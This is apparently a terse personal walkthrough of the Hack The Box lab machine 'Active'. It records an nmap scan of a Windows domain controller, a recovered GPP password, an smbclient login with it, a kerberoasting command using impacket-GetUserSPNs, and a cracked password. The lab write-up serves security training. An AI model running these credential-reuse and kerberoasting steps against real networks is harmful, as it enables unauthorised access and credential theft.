nmap
```
┌──(kali㉿kali)-[~/active-AD]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.233.98                                               
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 07:11 EST
Warning: 10.129.233.98 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.233.98
Host is up (0.045s latency).
Not shown: 64799 closed tcp ports (reset), 713 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-22 12:16:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49172/tcp open  msrpc         Microsoft Windows RPC
49179/tcp open  unknown
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-22T12:17:26
|_  start_date: 2025-01-22T12:09:59

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   45.56 ms 10.10.14.1
2   45.84 ms 10.129.233.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 341.67 seconds
```

![Pasted image 20250122201829](<0. Attachments/Pasted image 20250122201829.png>)

![Pasted image 20250122202351](<0. Attachments/Pasted image 20250122202351.png>)

![Pasted image 20250122202612](<0. Attachments/Pasted image 20250122202612.png>)

![Pasted image 20250122202752](<0. Attachments/Pasted image 20250122202752.png>)
SVC_TGS --> GPPstillStandingStrong2k18

![Pasted image 20250122202903](<0. Attachments/Pasted image 20250122202903.png>)

```
smbclient -N //10.129.233.98/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```
![Pasted image 20250122203308](<0. Attachments/Pasted image 20250122203308.png>)

kerberoasting
```
impacket-GetUserSPNs -request -dc-ip 10.129.233.98 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
![Pasted image 20250122203731](<0. Attachments/Pasted image 20250122203731.png>)
cracked password --> Ticketmaster1968

![Pasted image 20250122204336](<0. Attachments/Pasted image 20250122204336.png>)

